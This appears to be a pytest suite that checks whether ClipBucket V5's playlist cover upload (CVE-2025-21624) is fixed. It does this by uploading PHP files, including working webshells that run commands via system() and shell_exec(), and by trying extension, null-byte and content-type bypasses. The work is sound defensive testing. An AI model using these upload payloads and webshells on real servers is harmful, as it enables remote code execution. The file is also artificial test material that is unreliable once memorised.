#!/usr/bin/env python3
"""
Vulnerability Tests for ClipBucket V5 Playlist Cover Upload

These tests verify the file upload vulnerability in the playlist cover upload feature.
- FAIL in vulnerable state (vulnerability is exploitable)
- PASS in fixed state (vulnerability is mitigated)

CVE-2025-21624: Unrestricted File Upload leading to Remote Code Execution
"""

import pytest
import requests
import time
import os
from datetime import datetime

BASE_URL = os.environ.get("BASE_URL", "http://localhost")
DEFAULT_USER = os.environ.get("CB_USER", "admin")
DEFAULT_PASS = os.environ.get("CB_PASS", "admin")


class TestPlaylistCoverUploadVulnerability:
    """
    Test the playlist cover upload vulnerability.

    The vulnerability allows uploading arbitrary files (including PHP scripts)
    as playlist cover images, which can then be executed on the server.
    """

    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test session."""
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Test Suite)'
        })
        self._wait_for_server()
        self._login()
        # Use unique playlist IDs for each test to avoid conflicts
        self.test_pid = int(time.time()) % 100000

    def _wait_for_server(self, timeout=60):
        """Wait for the server to be ready."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(f"{BASE_URL}/", timeout=5)
                if response.status_code in [200, 302]:
                    return True
            except requests.RequestException:
                pass
            time.sleep(2)
        pytest.fail(f"Server at {BASE_URL} not ready after {timeout} seconds")

    def _login(self, username=None, password=None):
        """Authenticate to ClipBucket."""
        username = username or DEFAULT_USER
        password = password or DEFAULT_PASS

        login_url = f"{BASE_URL}/signup.php?mode=login"
        login_data = {
            'username': username,
            'password': password,
            'login': 'login'
        }

        response = self.session.post(login_url, data=login_data, allow_redirects=True)
        return response

    def _get_upload_path(self, pid, extension="php"):
        """Generate the expected upload path based on current date."""
        today = datetime.now()
        date_path = today.strftime('%Y/%m/%d')
        return f"{BASE_URL}/images/playlist_covers/{date_path}/{pid}.{extension}"

    def _try_upload_php_file(self, pid, php_content, filename="shell.php"):
        """Attempt to upload a PHP file as playlist cover."""
        upload_url = f"{BASE_URL}/manage_playlists.php?mode=edit_playlist&pid={pid}"

        files = {
            'playlist_cover': (filename, php_content.encode(), 'application/x-php')
        }
        data = {
            'upload_playlist_cover': 'submit'
        }

        response = self.session.post(upload_url, files=files, data=data)
        return response

    def _check_php_execution(self, url):
        """Check if PHP code at URL is executable."""
        try:
            response = self.session.get(url, timeout=10)
            return response
        except requests.RequestException:
            return None

    # ==================== VULNERABILITY TESTS ====================

    def test_php_upload_blocked_user_area(self):
        """
        Test that PHP file upload is blocked in user area.

        This test attempts to upload a PHP file as a playlist cover
        via the user-facing manage_playlists.php endpoint.

        PASS: Upload is blocked (endpoint removed or file type rejected)
        FAIL: PHP file is uploaded and accessible
        """
        pid = self.test_pid + 1
        php_content = '<?php echo "VULN_TEST_MARKER_001"; ?>'

        # Attempt upload
        upload_response = self._try_upload_php_file(pid, php_content)

        # Check if file was uploaded
        expected_url = self._get_upload_path(pid)
        shell_response = self._check_php_execution(expected_url)

        # If the shell content is returned and executed, vulnerability exists
        if shell_response and "VULN_TEST_MARKER_001" in shell_response.text:
            pytest.fail(
                f"VULNERABILITY EXISTS: PHP file uploaded and executed at {expected_url}\n"
                f"The playlist cover upload accepts PHP files without validation."
            )

        # Also check if the raw PHP code is returned (uploaded but not executed)
        if shell_response and shell_response.status_code == 200 and '<?php' in shell_response.text:
            pytest.fail(
                f"VULNERABILITY EXISTS: PHP file uploaded at {expected_url}\n"
                f"File was uploaded but PHP execution might be disabled."
            )

    def test_phtml_upload_blocked_user_area(self):
        """
        Test that .phtml file upload is blocked.

        .phtml is another PHP extension that may be executed by the server.
        """
        pid = self.test_pid + 2
        php_content = '<?php echo "VULN_TEST_MARKER_002"; ?>'

        # Attempt upload with .phtml extension
        upload_url = f"{BASE_URL}/manage_playlists.php?mode=edit_playlist&pid={pid}"
        files = {
            'playlist_cover': ('shell.phtml', php_content.encode(), 'application/x-php')
        }
        data = {
            'upload_playlist_cover': 'submit'
        }
        self.session.post(upload_url, files=files, data=data)

        # Check if file was uploaded
        expected_url = self._get_upload_path(pid, "phtml")
        shell_response = self._check_php_execution(expected_url)

        if shell_response and "VULN_TEST_MARKER_002" in shell_response.text:
            pytest.fail(
                f"VULNERABILITY EXISTS: .phtml file uploaded and executed at {expected_url}"
            )

    def test_php5_upload_blocked_user_area(self):
        """
        Test that .php5 file upload is blocked.

        .php5 is another PHP extension that may be executed by the server.
        """
        pid = self.test_pid + 3
        php_content = '<?php echo "VULN_TEST_MARKER_003"; ?>'

        upload_url = f"{BASE_URL}/manage_playlists.php?mode=edit_playlist&pid={pid}"
        files = {
            'playlist_cover': ('shell.php5', php_content.encode(), 'application/x-php')
        }
        data = {
            'upload_playlist_cover': 'submit'
        }
        self.session.post(upload_url, files=files, data=data)

        expected_url = self._get_upload_path(pid, "php5")
        shell_response = self._check_php_execution(expected_url)

        if shell_response and "VULN_TEST_MARKER_003" in shell_response.text:
            pytest.fail(
                f"VULNERABILITY EXISTS: .php5 file uploaded and executed at {expected_url}"
            )

    def test_webshell_upload_blocked(self):
        """
        Test that webshell upload is blocked.

        Attempts to upload a functional webshell that executes commands.
        """
        pid = self.test_pid + 4
        webshell_content = '''<?php
if(isset($_GET['cmd'])) {
    echo "WEBSHELL_START";
    system($_GET['cmd'] . ' 2>&1');
    echo "WEBSHELL_END";
}
if(isset($_GET['test'])) {
    echo "SHELL_ACTIVE_MARKER";
}
?>'''

        self._try_upload_php_file(pid, webshell_content)

        expected_url = self._get_upload_path(pid)
        shell_response = self._check_php_execution(f"{expected_url}?test=1")

        if shell_response and "SHELL_ACTIVE_MARKER" in shell_response.text:
            pytest.fail(
                f"VULNERABILITY EXISTS: Webshell uploaded and active at {expected_url}\n"
                f"Remote code execution is possible."
            )

    def test_command_execution_blocked(self):
        """
        Test that command execution via uploaded file is blocked.

        This is the critical RCE test - attempts to execute system commands.
        """
        pid = self.test_pid + 5
        webshell_content = '''<?php
if(isset($_GET['cmd'])) {
    echo "CMD_OUTPUT_START:";
    echo shell_exec($_GET['cmd']);
    echo ":CMD_OUTPUT_END";
}
?>'''

        self._try_upload_php_file(pid, webshell_content)

        expected_url = self._get_upload_path(pid)
        # Try to execute 'id' command
        shell_response = self._check_php_execution(f"{expected_url}?cmd=id")

        if shell_response:
            response_text = shell_response.text
            # Check for command output indicators
            if "CMD_OUTPUT_START:" in response_text and "uid=" in response_text:
                pytest.fail(
                    f"CRITICAL VULNERABILITY: Remote Code Execution confirmed!\n"
                    f"URL: {expected_url}\n"
                    f"Command execution output detected in response."
                )

    def test_php_upload_blocked_admin_area(self):
        """
        Test that PHP file upload is blocked in admin area.

        The same vulnerability exists in the admin area endpoint.
        """
        pid = self.test_pid + 6
        php_content = '<?php echo "ADMIN_VULN_TEST_001"; ?>'

        upload_url = f"{BASE_URL}/admin_area/manage_playlist.php?mode=edit_playlist&pid={pid}"
        files = {
            'playlist_cover': ('shell.php', php_content.encode(), 'application/x-php')
        }
        data = {
            'upload_playlist_cover': 'submit'
        }
        self.session.post(upload_url, files=files, data=data)

        expected_url = self._get_upload_path(pid)
        shell_response = self._check_php_execution(expected_url)

        if shell_response and "ADMIN_VULN_TEST_001" in shell_response.text:
            pytest.fail(
                f"VULNERABILITY EXISTS: PHP file uploaded via admin area at {expected_url}"
            )

    def test_upload_form_removed_or_protected(self):
        """
        Test that the upload form is either removed or properly protected.

        After the fix, the upload_playlist_cover form field should not exist
        or should reject non-image files.
        """
        # Always try to upload regardless of form visibility
        # The vulnerability exists in backend code, not just the HTML form
        pid = self.test_pid + 7
        php_content = '<?php echo "FORM_TEST_001"; ?>'
        self._try_upload_php_file(pid, php_content)

        expected_url = self._get_upload_path(pid)
        shell_response = self._check_php_execution(expected_url)

        if shell_response and "FORM_TEST_001" in shell_response.text:
            pytest.fail(
                "Upload endpoint accepts PHP files. "
                "The vulnerability should be mitigated by removing or protecting the upload handler."
            )

    def test_double_extension_bypass_blocked(self):
        """
        Test that double extension bypass is blocked.

        Attempts to bypass file type checks using double extensions like .php.jpg
        """
        pid = self.test_pid + 8
        php_content = '<?php echo "DOUBLE_EXT_VULN"; ?>'

        # Try various double extension bypasses
        bypass_extensions = [
            'shell.php.jpg',
            'shell.jpg.php',
            'shell.php%00.jpg',  # Null byte injection
            'shell.php;.jpg',
        ]

        for filename in bypass_extensions:
            upload_url = f"{BASE_URL}/manage_playlists.php?mode=edit_playlist&pid={pid}"
            files = {
                'playlist_cover': (filename, php_content.encode(), 'image/jpeg')
            }
            data = {
                'upload_playlist_cover': 'submit'
            }
            self.session.post(upload_url, files=files, data=data)

            # Check for .php extension in uploads
            expected_url = self._get_upload_path(pid, "php")
            shell_response = self._check_php_execution(expected_url)

            if shell_response and "DOUBLE_EXT_VULN" in shell_response.text:
                pytest.fail(
                    f"VULNERABILITY EXISTS: Double extension bypass worked with {filename}\n"
                    f"URL: {expected_url}"
                )
            pid += 1

    def test_content_type_bypass_blocked(self):
        """
        Test that content-type header manipulation bypass is blocked.

        Attempts to upload PHP with image content-type header.
        """
        pid = self.test_pid + 12
        php_content = '<?php echo "CONTENT_TYPE_BYPASS"; ?>'

        upload_url = f"{BASE_URL}/manage_playlists.php?mode=edit_playlist&pid={pid}"
        files = {
            'playlist_cover': ('shell.php', php_content.encode(), 'image/jpeg')  # Fake content-type
        }
        data = {
            'upload_playlist_cover': 'submit'
        }
        self.session.post(upload_url, files=files, data=data)

        expected_url = self._get_upload_path(pid)
        shell_response = self._check_php_execution(expected_url)

        if shell_response and "CONTENT_TYPE_BYPASS" in shell_response.text:
            pytest.fail(
                f"VULNERABILITY EXISTS: Content-type bypass worked\n"
                f"File uploaded despite fake image/jpeg content-type."
            )

    def test_arbitrary_pid_upload_blocked(self):
        """
        Test that upload with arbitrary playlist ID is blocked.

        The vulnerability allows uploading to any pid, even non-existent ones.
        """
        # Use a clearly non-existent playlist ID
        pid = 999999999
        php_content = '<?php echo "ARBITRARY_PID_VULN"; ?>'

        self._try_upload_php_file(pid, php_content)

        expected_url = self._get_upload_path(pid)
        shell_response = self._check_php_execution(expected_url)

        if shell_response and "ARBITRARY_PID_VULN" in shell_response.text:
            pytest.fail(
                f"VULNERABILITY EXISTS: Upload succeeded with arbitrary non-existent playlist ID\n"
                f"No validation of playlist existence."
            )


class TestUploadEndpointRemoval:
    """
    Tests to verify the upload endpoint is properly removed or secured.
    """

    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test session."""
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Test Suite)'
        })
        self._wait_for_server()
        self._login()

    def _wait_for_server(self, timeout=60):
        """Wait for the server to be ready."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(f"{BASE_URL}/", timeout=5)
                if response.status_code in [200, 302]:
                    return True
            except requests.RequestException:
                pass
            time.sleep(2)
        pytest.fail(f"Server at {BASE_URL} not ready after {timeout} seconds")

    def _login(self):
        """Authenticate to ClipBucket."""
        login_url = f"{BASE_URL}/signup.php?mode=login"
        login_data = {
            'username': DEFAULT_USER,
            'password': DEFAULT_PASS,
            'login': 'login'
        }
        self.session.post(login_url, data=login_data, allow_redirects=True)

    def test_upload_endpoint_does_not_process_files(self):
        """
        Test that the upload endpoint no longer processes uploaded files.

        After the fix, POSTing to the upload endpoint should not result in
        any file being saved to the playlist_covers directory.
        """
        pid = int(time.time()) % 100000 + 100
        unique_marker = f"ENDPOINT_CHECK_{int(time.time())}"
        php_content = f'<?php echo "{unique_marker}"; ?>'

        upload_url = f"{BASE_URL}/manage_playlists.php?mode=edit_playlist&pid={pid}"
        files = {
            'playlist_cover': ('test.php', php_content.encode(), 'application/x-php')
        }
        data = {
            'upload_playlist_cover': 'submit'
        }

        self.session.post(upload_url, files=files, data=data)

        # Check all possible date paths (today and yesterday for timezone issues)
        from datetime import timedelta
        dates_to_check = [
            datetime.now(),
            datetime.now() - timedelta(days=1),
            datetime.now() + timedelta(days=1)
        ]

        for check_date in dates_to_check:
            date_path = check_date.strftime('%Y/%m/%d')
            check_url = f"{BASE_URL}/images/playlist_covers/{date_path}/{pid}.php"

            try:
                response = self.session.get(check_url, timeout=5)
                if unique_marker in response.text:
                    pytest.fail(
                        f"VULNERABILITY EXISTS: Upload endpoint still processes files\n"
                        f"File found at: {check_url}"
                    )
            except requests.RequestException:
                pass


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
